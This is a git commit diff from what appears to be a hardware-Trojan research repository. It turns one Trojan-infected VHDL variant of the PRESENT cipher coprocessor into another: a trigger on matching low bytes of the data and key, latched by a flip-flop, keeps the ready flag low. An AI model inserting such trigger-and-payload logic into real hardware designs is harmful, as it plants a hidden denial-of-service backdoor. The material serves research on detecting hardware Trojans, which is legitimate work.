94cccd91a272fb37cd99c9cab5529954b8552fe0
Zeosleus <zeosleus@protonmail.com>
2023-05-28 14:35:57 +0300

    Added Trojan 4: Trigger=LSByte(data_in) equal to LSByte(key), Payload=prevent the ready flag from going high

--- rtl/PRESENT/04_present_Trojan4.vhd
+++ rtl/PRESENT/04_present_Trojan4.vhd
@@ -2,25 +2,24 @@ library ieee;
 use ieee.std_logic_1164.all;
 use ieee.numeric_std.all;
 
--- Trojan 2: trigger = Timebomb which triggers after each 2^k encryption/decryption operations
--- payload = disallow the output register's enable signal (out_ena) from going high, thus
--- not permitting the computed data to be placed on the output data bus.
+-- Trojan 4: trigger = Least Significant Byte(data_in) = Least Significant Byte(key)
+-- payload = disallow the ready flag from going high
 
-entity present_Trojan2 is
+entity present_Trojan4 is
         port (
-                clk             : in std_logic;
-                rst             : in std_logic;
-                ena             : in std_logic;
+                clk      : in std_logic;
+                rst      : in std_logic;
+                ena      : in std_logic;
 
-                mode_sel        : in std_logic_vector(1 downto 0);
-                key             : in std_logic_vector(127 downto 0);
-                data_in         : in std_logic_vector(63 downto 0);
-                data_out        : out std_logic_vector(63 downto 0);
-                ready           : out std_logic
+                mode_sel : in std_logic_vector(1 downto 0);
+                key      : in std_logic_vector(127 downto 0);
+                data_in  : in std_logic_vector(63 downto 0);
+                data_out : out std_logic_vector(63 downto 0);
+                ready    : out std_logic
         );
-end entity present_Trojan2;
+end entity present_Trojan4;
 
-architecture rtl of present_Trojan2 is
+architecture rtl of present_Trojan4 is
         signal  key_sched_out,
                 key_mem_out : std_logic_vector(63 downto 0);
 
@@ -38,17 +37,12 @@ architecture rtl of present_Trojan2 is
 
         signal  key_sched_ena,
                 out_ena,
-                load_ena : std_logic;
+                load_ena        : std_logic;
 
-        signal  ready_cu : std_logic;
+        signal ready_cu : std_logic;
 
-        constant TROJAN_COUNTER_WIDTH     : natural                                             := 10;
-        constant TROJAN_COUNTER_MAX_VALUE : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0) := (others => '1');
-
-        signal  trojan_trig,
-                trojan_out_ena : std_logic;
-
-        signal  trojan_counter_out : std_logic_vector(TROJAN_COUNTER_WIDTH - 1 downto 0);
+        signal  trojan_trig,                
+                trojan_ff_out    : std_logic;
 begin
         -- mode_sel(1) = 1 -> 128-bit key, 0 -> 80-bit key
         -- mode_sel(0) = 1 -> Decrypt, 0 -> Encrypt       
@@ -56,9 +50,9 @@ begin
         control_unit : entity work.present_control_unit
                 port map(
                         -- inputs
-                        clk    => clk,
-                        rst    => rst,
-                        ena    => ena,
+                        clk      => clk,
+                        rst      => rst,
+                        ena      => ena,
                         op_sel => mode_sel(0),
 
                         round_counter_val => current_round,
@@ -71,8 +65,30 @@ begin
 
                         key_sched_ena => key_sched_ena,
                         out_ena       => out_ena,
-                        ready         => ready_cu
+                        ready         => ready_cu                        
                 );
+        
+        trojan_trig <= '1' when data_in(7 downto 0) = key(7 downto 0) else '0';
+        
+        -- need a flip-flop to store the **trojan's state** (i.e. trigger condition satisfied or not),
+        -- since during normal operation the input data will change before entering DONE state
+        -- (i.e. when the round counter is equal to 31 for encryption and 0 for decryption).
+        -- The new data might not satisfy the Trojan triggering condition, which will cause
+        -- the deactivation of the Trojan before its payload is executed, thus the ready flag will be raised.
+        -- We use the load_ena signal as the trojan FF enable signal, since this signal goes high only when
+        -- in DONE state.
+        -- This way the trojan will "remember" its state until a crypto operation is DONE, and not change
+        -- during an encryption/decryption due to a change on the data input bus.
+        trojan_ff : entity work.dflip_flop
+                port map(
+                        clk => clk,
+                        ena => load_ena,
+                        rst => rst,
+                        d => trojan_trig,       -- store current trojan state
+                        q => trojan_ff_out
+                );
+
+        ready <= (NOT trojan_ff_out) AND ready_cu; -- malicious signal
 
         key_sched : entity work.key_schedule_top
                 port map(
@@ -130,22 +146,6 @@ begin
                         mux_out => mux_out
                 );
 
-        -- trojan counter
-        trojan_counter : entity work.counter
-                generic map(
-                        COUNTER_WIDTH => TROJAN_COUNTER_WIDTH
-                )
-                port map(
-                        clk     => ready_cu,
-                        cnt_ena => ena,
-                        rst     => rst,
-                        count   => trojan_counter_out
-                );
-
-        trojan_trig <= '1' when trojan_counter_out = TROJAN_COUNTER_MAX_VALUE else '0';
-        
-        trojan_out_ena <= out_ena AND NOT(trojan_trig);
-
         -- Coprocessor-global output register, in order to preserve the computed output data,
         -- until new ones are available. This can be helpful when a device reading from
         -- the coprocessor's output, reads with a rate less than the data output rate.
@@ -154,13 +154,10 @@ begin
                         DATA_WIDTH => 64
                 )
                 port map(
-                        clk => clk,
-                        ena => trojan_out_ena,
-                        -- ena  => out_ena,
+                        clk  => clk,
+                        ena  => out_ena,
                         rst  => rst,
                         din  => mux_out,
                         dout => data_out
-                );
-
-        ready <= ready_cu;
+                );                             
 end architecture;
